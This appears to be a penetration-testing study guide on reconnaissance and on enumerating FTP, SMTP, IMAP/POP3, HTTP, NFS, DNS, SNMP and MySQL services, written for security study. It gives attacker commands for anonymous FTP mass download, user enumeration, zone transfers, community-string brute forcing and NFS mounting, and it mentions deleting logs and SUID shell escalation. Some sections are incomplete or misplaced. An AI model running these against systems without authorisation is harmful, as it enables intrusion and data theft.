## **Introduction**

<a id="typesofpentests"></a>

### **`Types of Penetration Tests`**


While there are many different types of penetration tests, the main ones include:

* **`External Network Pentest`:** Looks at an organization's security from the outside; this is hacking a network or machine from the outside. This heavily relies on Open-Source Intelligence (OSINT) gathering. OSINT helps gather as much data as possible that is publically available on the internet. These types of pentests are the most common because many compliance organizations dictate that an external network pentest must be performed annually.

* **`Internal Network Pentest`:** Assesses an organization's security from the inside of the network, which means that the perimeter has already been breached. This heavily relies on Active Directory (AD) attacks as 90-95% of organizations use AD. 

* **`Web Application Pentest`:** The second most common type of penetration test, after the external. There is a broad attack surface and the methodology focuses on web-based attacks and the OWASP testing guidelines. 

* **`Wireless Pentest`:** Assesses an organization's wireless network security. Depending on the wireless type being used, the methodology will vary: if a guest network, segmentation will be tested; if WPA2-PSK is being used, the PSK will be tested for password strength; if WPA2 Enterprise is being used, several other attacks can be attempted. To perform a wireless pentest, a wireless network adapter will be needed to perform packet injection. 

**Physical Pentests** and **Social Engineering** assesses an organization's physical security and/or end-user training. The methodology depends on the task and goals of the organization. 

<a id="stepsinethicalhacking"></a>

### **`Steps in Ethical Hacking`**

**1. `Reconnaissance`:** Gathering information about the target system or network. The goal is to collect as much information as possible to understand the target and identify potential entry points. There are two main forms:
   * **Passive:** Collecting information about a target without directly interacting with the target system or network to remain undetected. This includes searching publicly available information, browsing websites, and examining DNS records.

   * **Active:** Gathering information about a target network or system by actively engaging with it. It often involves techniques that directly interact with the target to obtain information, like sending pings, performing DNS queries, or using tools like Nmap to discover hosts and services. 

**2. `Scanning`:** Actively probe the target system or network to discover open ports, services, and vulnerabilities. This step identifies potential weaknesses that can be exploited.
   * Port scanning, network mapping, and vulnerability scanning

**3. `Gaining Access`:** In this stage, the ethical hacker attempts to gain unauthorized access to the target system or network.
   * Password cracking, social engineering, and exploiting software vulnerabilities to gain access to the target system; essentially exploit vulnerabilities discovered during the scanning stage.

**4. `Maintaining Access`:** Once access is gained, the hacker should aim to maintain access to the compromised system or network. The goal is to mimic the actions of a real attacker and assess the potential impact of a successful compromise
   * Bypassing security mechanisms, setting up backdoors or remote access tools, and establishing persistent access.
      
**5. `Covering Tracks`:** The final step involves the hacker removing traces of their activities from the target system or network. The goal is to ensure that the hacking activity remains undetected, leaving no evidence of the penetration testing. 
   * Deleting logs, modifying or removing files, and restoring the system to its original state. 


<a id="reconnaissance"></a>

### **`Reconnaissance`**

**Passive Reconnaissance** mostly focuses on the physical and social engineering aspects of gathering information on a company. This may include determining location information and employee information, most of which can be determined through OSINT. 

The following details steps to perform **`Active Reconnaissance`** on web and hosts:
   1. **Target Validation:** The target should be validated to confirm that the correct machine is being attacked.

      * **WHOIS:** Outputs information about domain name, registry expiry date, registrar, contact information, name servers. This information is obtained from the ICANN.
         * `whois [-aAbfgiIklmPQrRS] [-c country-coode | -h hostname] [-p port] name ...`
      
      * **nslookup:** Queries the DNS to obtain the mapping between the domain name and IP address, or other DNS records. There are two modes: interactive and noninteractive. Type nslookup to enter the interactive menu
         * `nslookup [-option] [name | -] [server]`

      * **dnsrecon:** Gathers DNS-oriented information on a given target
         * `dnsrecon [-d domain] [-n NS server] [-r range] [-D dictionary] [--threads threads] [--db DB] [-x XML] [-c CSV] [-j JSON]`

      * **Email Discovery:** [hunter.io](https://hunter.io)

   2. **Finding Subdomains**
      * **Google Fu**

      * **dig:** Performs DNS lookups and displays the answers that are returned from the name server(s) that were queried.
         * `dig @server name [of the resource record] type [-ANY, A, MX, SIG, etc]`

      * **dirsearch:** Brute forces directories and files in web servers. Also check out ffuf, gobuster, dirb, and dirbuster.
         * `dirsearch [-u url]`

      * **[crt.sh](https://crt.sh)**


   3. **Fingerprinting:** Gathering unique identifying information about a system, network, or device by analyzing its characteristics, such as operating system version, software applications, network configurations, and hardware details. There is more about fingerprinting in the following section.
      * **Server Type**

      * **Open Ports and Services**

      * **NMAP**

      * **Wappalyzer**

      * **Whatweb:** Identifies websites by recognizing web technologies like CMSs, blogging platforms, statistic/analytics packages, JS libraries, web servers and embedded devices. 
         * `whatweb [--a=LEVEL | 1 stealthy, 4 heavy] [options] <URLs>`

      * **[builtwith.com](https://builtwith.com):** Look for frameworks, CDNs, and CMSs

<br>

To automate OSINT gathering of a website, **theHarvester** can be especially useful. 
   * `sudo theHarvester -d <domain.com> -l <number results> -b <search engine to query>`

<a id="footprinting"></a>

### **`Footprinting`**

<a id="dmaininfofootprint"></a>

#### **`Domain Information`**

Domain information refers to an organization's functionality, technology, structures and subdomains. This type of information is gathered passively without direct and active scans. When passively gathering information, third-party services can be used to understand the organization better. The first thing that should be done is scrutinize the company's main wesite. Then, read through the texts while keeping in mind what technologies and structures are needed for these services. 

<br>

**<u>Online Presence</u>**

Once there is a basic understanding of the organization and its services, get an impression of its precense on the internet. 
* The firs point of presence on the internet may be the **`SSL Certificate`** from the company's main website that can be examined. Often, such a certificate includes more than just a subdomain, and this means that the certificate is used for several domains, and these are most likely still active. 

* Another source to find more subdomains is [crt.sh](https://crt.sh). This source is Certificate Transparency logs. **`Certificate Transparency`** is a process that is intended to enable the verification of issued digital certificates for encrypted internet connections. RFC 6962 provides for the logging of all digital certificates issued by a CA in audit-proof logs. This is intended to enable the detection of false or maliciously issued certificates for a domain. SSL certificate providers share this with crt.sh, which stores the new entiries in the database to be accessed later. 

There are various ways to discover subdomains, but using the crt.sh website, the following commands can be done to (1) output the results in JSON, (2) find unique subdomains, and (3) find company hosted servers:
```bash
curl -s https://crt.sh/\?q\=<domain.com>\&output\=json | jq .

curl -s https://crt.sh/\?q\=<domain.com>\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u

for i in $(cat subdomainlist);do host $i | grep "has address" | grep <domain.com> | cut -d" " -f1,4;done

```

Once it is determined which hosts can be investigated further, a list of IP addresses can be generated with a minor adjustment to the cut command and run them through **`Shodan`.** Shodan can be used to find devices and systems permanently connected to the internet. It searches the internet for open TCP/IP ports and filters the systems according to specific terms and criteria:
```bash
for i in $(cat subdomainlist);do host $i | grep "has address" | grep <domain.com> | cut -d" " -f4 >> ip-addresses.txt;done

for i in $(cat ip-addresses.txt);do shodan host $i;done

```

At this point, all of the available DNS records can be displayed to find more hosts. 
```bash
dig any <domain.com>
```
* **`A` Records:** IP addresses that point to a specific (sub)domain through the A record

* **`MX` Records:** The mail server records show which mail server is responsible for managing the emails for the company. 

* **`NS` Records:** These records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider. 

* **`TXT` Records:** This type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as SPF, DMARC, and DKIM, which are responsible for verifying and confirming the origin of the emails sent 

<a id="cloudresourcesfootprint"></a>

#### **`Cloud Resources`**

Even though CSP secure their infrastructure centrally, this does not mean that companies are free from vulnerabilities. The configurations made by the administrators may make the company's cloud resources vulnerable. This often starts with the S3 buckets (AWS), blobs (Azure), and cloud storage (GCP), which can be accessed without authentication if configured incorrectly. 

Often cloud storage is added to the DNS list when used for administrative purposes by other employees. This makes it easier for the employees to reach and manage them; however, there are many different ways to find such cloud storage. **`Google Dorks`** can be used to narrow down the search:
* `intext: <company name> inurl: <bucket, blob, cloud storage url>`
  * inurl:amazonaws.com
  * inurl:blob.core.windows.net

Besides Google Dorks, [domain.glass](https://domain.glass/) or [GrayHatWarfare.com](https://buckets.grayhatwarfare.com/) can be used to discover more about the cloud infrastructure. 

Sometimes, employees may accidentally leak their private SSH keys.

   3. **UDP Scan**
      * `-sU` checks for open UDP ports. This will take a long time
```bash
nmap -sU <IP Address>
```

<br>

   4. **Scan for Vulnerabilities**
      * `-Pn` treats all hosts as if they are onlune
      * `--script` runs vulnerability detection scripts against the target

      * `-D` cloaks a scan with decoys

### **`Enumerating FTP/TFTP`**

In an **`Active FTP`** session, two channels are opened. With this FTP connection, two channels are opened:
* The client and server establish a control channel through **TCP port 21.** The client sends commands to the server and the server returns status codes.

* Both communication participants can establish the data channel via **TCP port 20.** This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact. 

If a firewall protects the client, the server cannot reply because all external connections are blocked. Because of this, **`Passive FTP Mode`** was developed. With this FTP connection, the server announces a port through which the client can establish the data channel; since the client initiates the connection in this method, the firewall does not block the transfer. 

The FTP knows different commands and status codes; not all of these commands are consistently implemented on the server. For example, the client-side instructs the server-side to upload or download files, organize directories or delete files. The server responds in each case with a status code that indicates whether the command was successfully implemented. 

Usually, when accessing FTP on a server, credentials are needed. It is important to note that FTP is a clear-text protocol that can sometimes be sniffed if conditions on the network are right; however, some servers offer **anonymous FTP,** where the server operator allows any user to upload or download files via FTP without using a password. Since there are security risks associated with this type of public FTP server, the options for users are usually limited.

<br>

**<u>TFTP</u>**

TFTP is simpler than FTP and performs file transfers between client and server processes. However, it does not provide user authentication and other valuable features supported by FTP. While FTP uses TCP, TFTP uses **UDP port 69,** making it an unreliable protocol and causing it to use UDP-assited application layer recovery. 
* TFTP does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the OS
   * This leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally
8 Because of the lack of security, TFTP should only be used in local and protected networks

The following are a few commands of TFTP:
* **`connect`:**  Sets the remote host, and optionally the port, for file transfers

* **`get`:** Transfers a file or set of files from the remote host to the local host

* **`put`:** Transfers a file or set of files from the local host onto the remote host

* **`quit`:** Exists tftp

* **`status`:** Shows the current status of tftp, including the current transfer mode (ASCII or binary), connection status, time-out value, etc

* **`verbose`:** Turns verbose mode, which displays additional information during the file transfer, on or off

> Unlike the FTP client, TFTP does not have directory listing functionality

<br>

**<u>Default Configuration</u>**

One of the most used FTP servers on Linux distros is **`vsFTPd`.** The default configuration of vsFTPd can be found in **`/etc/vsftpd.conf`,** and some settings are already predefined by default. To install vsFTPd, the following command can be executed:

**<u>Dangerous Settings</u>**

One of the authentication mechanisms is the **anonymous** user. THis is often used to allow everyone on the internal network to share files and data without accessing each other's computers. With vsFTPd, the optional settings that can be added to the configuration file for the anonymous login look as follows:

* **`anonymous_enable=YES`:** Allows anonymous login

* **`anon_upload_enable=YES`:** Allows anonymous user to upload files

* **`anon_mkdir_write_enable=YES`:** Allows anonymous user to create new directories

* **`no_anon_password=YES`:** Does not ask the anonymous user for a password

* **`anon_root=/home/username/ftp`:** The directory of the anonymous user

* **`write_enable=YES`:** Allows the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE

With the standard FTP client, the FTP server can be accessed with the anonymous user if the settings shown above have been used. The use of the anonymous account can occur in internal environments and infrastructures where the participants are all known. Access to this type of service can be set temporarily or with the setting to accelerate the exchange of files. 

To log in with the anonymous credentials, just type **anonymous** as the username and password. 

Many commands are similar to that of Linux, but with some additions. For example, `ls -R` recursively lists files. This may or may not be enabled on the machine. This may be useful as it can potentially disclose the users and groups on the machine. If the `hide_ids` option is set to YES, then this will show ftp as both the user and group to mask UIDs and GUIDs.
* If the UIDs are not hidden, then an attacker can brute force a password to access the machine through ssh or another remote connection protocol.


From the local machine, it is also possible to download all of the files and folders that are accessible on the remote machine all at once. This, however, may trigger alarms because a "normal" user would likely never do this:
```bash
wget -m --no-passive ftp://anonymous:anonymous@<IP Address>
```
* If this command is executed, a new directory will be created with the name of the IP address of the target. All downloaded files are stored there, which can be inspected locally.

<a id="enumeratingsmtp"></a>

### **`Enumerating SMTP`**

SMTP is used for sending emails in an IP network; SMTP can be used between an email client and an outgoung mail server or between two SMTP servers. This protocol is often combined with IMAP or POP3 protocols, which retrieve emails. SMTP is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. By default, SMTP servers accept connection requests on **`TCP port 25`,** however, newer SMTP servers also use **`TCP port 587`,** which is used to receive mal from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. 
* SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plaintext. To prevent unauthorized reading of data, the SMTP is used in tandem with SSL/TLS encryption. Under certain circumstances, a sever uses a port other than the standard TCP port 25 for the encrypted connection, like **`TCP port 465`.**

To interact with the SMTP server, telnet is used to initialize a TCP connection with the SMTP server. The following commands can be used when in a session:
* **`AUTH PLAIN`:** AUTH is a service extension used to authenticate the client

* **`HELO`:** The client logs in with its computer name and thus starts the session

* **`MAIL FROM`:** The client names the email sender

* **`RCPT TO`:** The client names the email recipient

* **`DATA`:** The client initiates the transmission of the email

* **`RSET`:** The client aborts the initiated transmission but keeps the connection ebtween client and sender

* **`VRFY`:** The client checks if a mailbox is available for message transfer

* **`EXPN`:** The client also checks if a mailbox is available for messaging with this command

* **`NOOP`:** The client requests a response from the server to prevent disconnection due to time-out

* **`QUIT`:** The client terminates the session

The actual initialization of the session is done with `HELO` or `EHLO`:
```bash
telnet <IP address> 25

HELO <mail.domain.server>

EHLO <mail1>

```

The command **`VRFY` can be used to enumerate existing users on the system;** however, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue code 252 and confirm the exitence of a user that does not exist on the system. 
```bash
telnet <IP address> 25


VRFY <user>

```

Because of this, it is not a good idea to rely entirely on the results of automatic tools. Sometimes, a web proxy can be used to connect to the SMTP sever:
```bash
CONNECT <IP address8>:25 HTTP/1.0

```

To actually send an email through the CLI, the subject, CC, BCC, and the other information can be included:
```bash
telnet <IP address> 25

EHLO <mail.server>


MAIL FROM: <<user@email.com>>  #wrap with one '<>'


RCPT TO: <<user@email.com>> NOTIFY=success,failure  #wrap with one <>

DATA

From: <<user@email.com>>
To: <<user@email,com>>
Subject: <subject>
Date: <date>
text
.     # end with period



QUIT
```

<br>

**<u>Footprinting SMTP</u>**

The default nmap scripts include smtp-commands, which uses the EHLO command to list all possible commands that can be executed on the target SMTP server:
```bash
sudo nmap <IP address> -sC -sV -p25

```
The smtp-open-relay NSE script can also be used to identify the target SMTP server as an open relay using 16 different tests:
```bash
sudo nmap <IP address> -p25 --script smtp-open-relay -v

```

Because the VRFY command is useless, use **msfconsole (search auxiliary smtp)** or **smtp-user-enum** with a cheeky seclist wordlist to enumerate actual existing users. Do both simulataneously and compare them. It's still worth trying each username that is output, unless every username on the wordlist gets output. This is a clear sign that the footprinting tool is broken. 

<a id="enumeratingimapetpop3"></a>

### **`Enumerating IMAP/POP3`**

When IMAP is used, the client establishes the connection to the server via **`TCP port 143`.** For communication, it uses text-based commands in ASCII format; several commands can be sent in succession without waiting for confirmation from the server. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.
* SMTP is usually used to send emails. By copying sent emails into an IMAP folder, all clients have access to all sent mails, regardless of the computer from which they were sent
* Another advantage of IMAP is creating personal folders and folder structures in the mailbox. This feature makes the mailbox clearer and easier to manage, however, the storage space requirement on the email server increases. 

Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plaintext. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes. Depending on the method and implementation used, the encryption connection uses the aforementioned TCP port or **`TCP port 993`.**

**<u>IMAP Commands</u>**

Before getting into the commands, a user must choose a tag to prepend the commands. This is arbitrary and is chosen by the client; the following example uses `1` as the tag:
* **`1 LOGIN <username> <password>`:** User's login

* **`1 LIST "" *`:** Lists all directories

* **`1 CREATE "<INBOX>"`:** Creates a mailbox with a specified name

* **`1 DELETE "<INBOX>"`:** Deletes a mailbox

* **`1 RENAME "<original>" "<new>"`:** Renames a mailbox

* **`1 LSUB "" *`:** Returns a subset of names from the set of names that the user has declared as being active or subscribed

* **`1 SELECT <INBOX>`:** Selects a mailbox so that messages in the mailbox can be accessed

* **`1 UNSELECT <INBOX>`:** Exits the selected mailbox

* **`1 FETCH <ID> all`:** Retrieves data associated with a message in the mailbox

* **`1 CLOSE`:** Removes all messages with the Deleted flag set

* **`1 LOGOUT`:** Closes the connection with the IMAP server

<br>

**<u>POP3 Commands</u>**
* **`USER <username>`:** Identifies the user

* **`PASS <password>`:** Authentication of the user using its password

* **`STAT`:** Requests the number of saved emails from the server

* **`LIST`:** Requests from the server the number and size of all emails

* **`RETR <id>`:** Requests the server to deliver the requested email by ID

* **`DELE <id>`:** Requests the server to delete the requested email by ID

* **`CAPA`:** Requests the server to display the server capabilities

* **`RSET`:** Requests the server to reset the transmitted information

* **`QUIT`:** Closes the connection with the POP3 server

<br>

**<u>Footprinting IMAP/POP3</u>**

By default, **TCP ports `110` and `995` are used for POP3,** and **TCP ports `143` and `993` are used for IMAP.** The higher ports are the encrypted versions for each service. Using nmap, the server can be scanned for these ports:
```bash
sudo nmap <IP address> -sV -p110,143,993,995 -sC

```

If the credentials of one of the users are gathered, an attacker could log in to the mail server and read or send individual messages.
```bash
curl -k 'imaps://<IP address>' --user <usenamer>:<password>

curl -k 'imaps://<IP address>' --user <usenamer>:<password> -v
```
* The `-v` flag enables verbose output. From this, the TLS version, details of the SSL certificate, and the banner can be obtained. 

To interact with the IMAP or POP3 server over SSL, **`openssl` or `nc`** can be used:
```bash
openssl s_client -connect <IP address>:pop3s

openssl s_client -connect <IP address>:imaps
```

### **`Enumerating HTTP and HTTPS`**

Default webpages are considered automatic findings because they explain the architecture and client's hygiene. When enumerating websites, it is important to do the following:
* View source code
* Look for additional directories and subdirectories
* Click on links to see if 404 pages redirect or not. If they do not, look at the requested URL, server name, and host name.
* Server headers may also disclose server information
* Check /robots.txt

<br>

While there are several tools to find [sub] directories of domain, the following two are the most effective. DNSenum is quick and can recursively search for subdomains, which may be useful in certain situations; if the following commands don't yield enough information, then use other fuzzing tools to find subdirectories:
```bash
wfuzz -w <wordlist> -u <http://domain.com> -H 'Host: FUZZ.<domain.com>' --hc 400,404  -c --hh <filter out characters>

dnsenum --enum <domain.com> -f <wordlist> -r

```

**nikto:** Examines a web server to find potential problems and security vulnerabilities, including server and software misconfigurations, default files and programs, insecure files and programs, outdated servers and programs. 
```bash
nikto -h <http://domain>

```

**dirb:** Web content scanner that looks for existing web objects.
```bash
dirb <http://domain> <wordlist files> [-X extensions | .html, .php, etc]

```

**dirbuster:** This is essentially the GUI version of dirb; it is specific to directory and file busting. Make sure the target URL is in the format of `url:port/`, and if file extensions are to be fuzzed, then separate them with commas. 

<br>

**gobuster:** Used to brute force directories and files in websites, DNS subdomains, virtual host names, open S3 buckets, and TFTP servers. The example shows the keyword fuzz command
   * `dir` Uses directory/file enumeration mode
   * `dns` Uses DNS subdomain enumeration mode
   * `fuzz` Replaces the FUZZ keyword in the URL, headers and the request body
   * `vhost` Uses VHOST enumeration mode
```bash
gobuster -u <http://FUZZ.domain.com> -w <wordlist> fuzz

```

**assetfinder:** Searches for domains that are related to the searched domain. If these domains are out of scope, use the `--subs-only` flag
```bash
assetfinder [--subs-only] <domain.com>`

```

**amass:** Shows attack surface mapping and asset discovery.
```bash
amass enum -d <domain.com>`

```

**ffuf:** Automated tool to fuzz the web application's individual components or a web page. If a 200 response code is returned to one of the fuzzed webpages, then the page exists on the web server. 
```bash
ffuf -w <wordlist>:FUZZ -u <http://domain:port/>FUZZ           #Directory Fuzzing

ffuf -w <wordlist>:FUZZ -u <http://domain:port/>pageFUZZ       #Extension Fuzzing; change page for a known file name while fuzzing the extension.

ffuf -w <wordlist>:FUZZ -u <http://domain:port/>FUZZ.php       #Page Fuzzing; change php for a known extension, while fuzzing the file name.

ffuf -w <wordlist>:FUZZ -u <http://domain:port/>FUZZ -recursion -recursion-depth 1 -e .php -v  #Recursive Fuzzing; 
                                                                                               #change php for any desired extensionh

ffuf -w <wordlist>:FUZZ -u <http://FUZZ.domain:port/>          #Subdomain Fuzzing

ffuf -w <wordlist>:FUZZ -u <http://FUZZ.domain:port/> -H 'Host: FUZZ.domain.com' -fs xxx       #VHOST Fuzzing: Similar to subdomain fuzzing. 
                                                                                               #-fs is used to filter HTTP response size

ffuf -w <wordlist>:FUZZ -u <http://FUZZ.domain:port/>directory/file.ext?FUZZ=key -fs xxx       #GET Fuzzing

#POST Fuzzing
ffuf -w <wordlist>:FUZZ -u <http://FUZZ.domain:port/>directory/file.ext -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx  

#Value Fuzzing
ffuf -w <wordlist>:FUZZ -u <http://FUZZ.domain:port/>directory/file.ext -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx    

```

<a id="enumeratingnfs"></a>

### **`Enumerating NFS`**

NFS is a network file system that has the same purpose as SMB, but uses an entirely different protocol. It uses **TCP/UDP ports 2049** and **TCP/UDP port 111.** NFS is used between Linux and Unix systems, which means that NFS clients cannot communicate directly with SMB servers. 
* NFSv3 authenticates the client computer
* NSFv4 the user must authenticate

The most common authentication is via UNIX UID/GID and group memberships, which is why this syntax is most likely to be applied to the NFS protocol. However, the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to confirm. This is why NFS should only be used with this authentication method in trusted networks. 

<br>

When footprinting NFS, the TCP ports 111 and 2049 are essential. Information about the NFS service and the host can be gathered via RPC as well:
```bash
sudo nmap <IP address> -p111,2049 -sV -sC

```

The rpcinfo NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This enables attackers to check whether the target share is connected to the network on allr equired ports. Also, for NFS, nmap has some NSE scripts that can be used for the scans. These can potentially disclose the contents of the share and its stats:
```bash
sudo nmap --script nfs* <IP address> -sV -p111,2049

```
Once an NFS service has been discovered, it can be mounted to the location machine. For this, a new empty folder can be created to which the NFS share will be mounted. Once mounted, navigate to it and view the contents:
```bash
showmount -e <IP address>
# this will output the files that can be pulled from the machine

mkdir /mnt/target-NFS
sudo mount -t nfs <IP address>:/ mnt/target-NFS/ -o nolock
cd /mnt/target-NFS

```
Within these files, the rights, usernames, and groups to whom the shown and viewable files belong to will be accessible. Once the usernames, group names, UIDs, and GUIDs are gathered, an attacker can create them on their local machine and adapt them to the NFS share to view and modify the files
```bash
ls -l mnt/nfs/ #contents with usernames and group names

ls -n mnt/nfs/ #contents with UIDs and GUIDs

```

> It is important to note that if the root_squash option is set, the `backup.sh` file cannot be edited, even as root. 

NFS can be used for further escalation; for example, if an attacker has access to the system via ssh and they want to read files from another folder that a specific user can read, they would need to upload a shell to the NFS share that has the SUID of that user and then run the shell via the SSH user. 

After all the information is obtained, the NFS share can be unmounted:
```bash
cd /mnt
sudo umount ./target-NFS
```

<a id="enumeratingdns"></a>

### **`Enumerating DNS`**

Different DNS records are used for the DNS queries, which all have various tasks; moreover, separate entries exist for different functions since different servers can be set up for a domain. The following lists common DNS records:
* **`A`:** Returns an IPv4 address of the requested domain as a result

* **`AAAA`:** Returns an IPv6 address of the requested domain

* **`MX`:** Returns the responsible mail servers as a result

* **`NS`:** Returns the DNS servers (nameservers) of the domain

* **`TXT`:** This record can contain various information. The all-rounder can be used, i.e., to validate the Google Search Console or validate SSL certificates. In adition, SPF and DMARC entries are set to validate mail traffic and protect it from spam

* **`CNAME`:** THis record serves as an alias for another domain name. If an administrator wants www.domain.com to point to the same IP as domain.com, they would create an A record for domain.com and a CNAME record for www.domain.com

* **`PTR`:** Contains a reverse lookup. It converts IP addresses into valid domain names

* **`SOA`:** Provides information about the corresponding DNS zone and email address of the administrative contact
   * Located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed. 
```bash
dig soa domain.com
# The period is replaced by an @ sign in the email address. 

```

**<u>Footprinting DNS</u>**

The footprinting at DNS servers is done as a result of the sent requests. First of all, **the DNS server can be queried as to which other name servers are known.** This can be done using the NS record and the specification of the DNS server that is to be queried using the `@` character. This is because if there are other DNS servers, they can also be used query the records. However, other DNS servers may be configured differently, and may be permanent for other zones:
```bash
dig ns <domain.com> @<IP address>

```

Sometimes it is also possible to **query a DNS server's version** using a class CHAOS query and type TXT; however, this entry must exist on the DNS server. This can be done as follows:
```bash
dig CH TXT version.bind <IP address>

```

**The ANY option can be used to view all available records.** This will cause the server to show the user querying all the available entries that it is willing to disclose. It is important to note that not all entries from the zones will be shown:
```bash
dig any <domain.com> @<IP address>

```

To view **additional information, including more subdomains,** the following commands can be executed:
```bash
dig axfr <domain.com> @<IP address>

dig axfr internal.<domain.com> @<IP address>

```

The individual `A` records with the hostnames can also be found out through a brute force attack. This can be done with a list of possible hostnames, which can be found in Seclists. The following automates a subdomain brute force:
```bash
for sub in $(cat /seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.<domain.com> @<IP address> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

```

Besides this, `dnsenum` can automate this process:
```bash
dnsenum --dnsserver <IP address> --enum -p 0 -s 0 -o subdomains.txt -f /seclists/Discovery/DNS/subdomains-top1million-110000.txt <domain.com>
```

### **`Enumerating SNMP`**

While SNMP was created to monitor network device, it also transmits control commands using agents over **`UDP port 161`.** The client can set specific values in the device and change options and settings with these commands. It is always the client who actively requests information from the server; SNMP also enables the use of **`"traps" over UDP port 162`,** which are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side. For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides; this addressing mechanism for successfully transmitting data and network monitoring using SNMP.

Before getting into footprinting, the following concepts must be understood:
* **`MIB`:** To ensure that SNMP access works across manufacturers and with different client-server combinations, the **Management Information Base (MIB)** was created. MIB is an independent format for storing device information.
  * A MIB is a text file in which all querybale SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one **Object Identifier (OID),** which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object

  * MIB files are written in the **Abstract Syntax Notation One (ASN.1)** based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.

* **`OID`:** An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them
  * The OIDs consist of integers and are usually concatenated by dot notation. A user can look up many MIBs for the associated OIDs in the **Object Identifier Registry.**

* **`Community Strings`:** Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. 
  * It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active. This causes

  * The lack of encryption of the data sent is also a problem because every time the community strings are sent over the network, they can be intercepted and read


The following are potentially encounterable SNMP versions that can be found on machines:
* **`SNMPv1`:** Used for network management and monitoring. Of course, this is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify the network data. Besides this, SNMPv1 does not support encryption, so the data can be easily intercepted. 

* **`SNMPv2`:** There are many versions of SNMPv2, but the primary version in use today is **`v2c`,** where the extenction **c** means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption

* **`SNMPv3`:** In SNMPv3, the security has been increased significantly. This includes authentication and transmission encryption (via PSK) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than v2c. 

<br>

**<u>Footprinting SNMP</u>**

For footprinting SNMP, **`snmpwalk`, `onesixtyone`** and `braa` can be used. snmpwalk is used to query the OIDs with their information; onesixtyone can be used to brute force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take some time. Before footprinting with snmpwalk, it is critical to scan the machine with nmap. 
```bash
nmap <IP address> -sV -sC -sU

```
Once this is done, at least the version will be discovered. If there is a misconfiguration, using the community string of **pulic** would yield a lot of useful information. Nevertheless, once the community string is discovered, and granted that the SNMP service does not require authentication, the internal system can be queried for information. 

```bash
snmpwalk -v [1, 2c] -c public <IP address>

```

If the community string is still unknown, **onesixyone** can be used in tandem with a seclist wordlist to identify these community strings:
```bash
sudo apt install onesixtyone

onesixtyone -c /seclists/Discovery/SNMP/snmp.txt <IP address>

```
Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify; however, extensive networks with hundreds of different servers managed with SNMP will likely have some pattern to them. Therefore, different rules can be used to guess them. 

Once a community string is determined, **braa** can be used to brute force the individual OIDs and enumerate the information behind them:
```bash
sudo apt install braa

braa <community string>@<IP>:.1.3.6.*   
```

### **`Enumerating MySQL`**

This section covers installing a safe MySQL server, as well as enumerating a remotely hosted MySQL server. 

To install MySQL and review the default configurations, the following commands can be executed:
```bash
sudo apt install mysql-server -y
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'

```
The main security-related options include:
* **`user`:** Sets which user the MySQL service will run as

* **`password`:** Sets the password for the MySQL user

* **`admin_address`:** The IP address on which to listen for TCP/IP connections on the administrative network interface

* **`debug`:** This variable indicates the current debugging settings

* **`sql_warnings`:** This variable controls whether single-row INSERT statements product an information string if warnings occur

* **`secure_file_priv`:** This variable is used to limit the effect of data import and export operations

The first three options are relevent to cybersecurity because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If there is another way to read files or even a shell, the file can be seen where the username and password are stored for the MySQL server. If there are no other security measures to prevent unauthorized access, the entire database can be exposed. 

Similarly, the debug and sql_warnings options provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web apps. Accordingly, the SQLi could be manipulated even to have the MySQL server execute system commands.

<br>

**<u>Footprinting MySQL</u>**

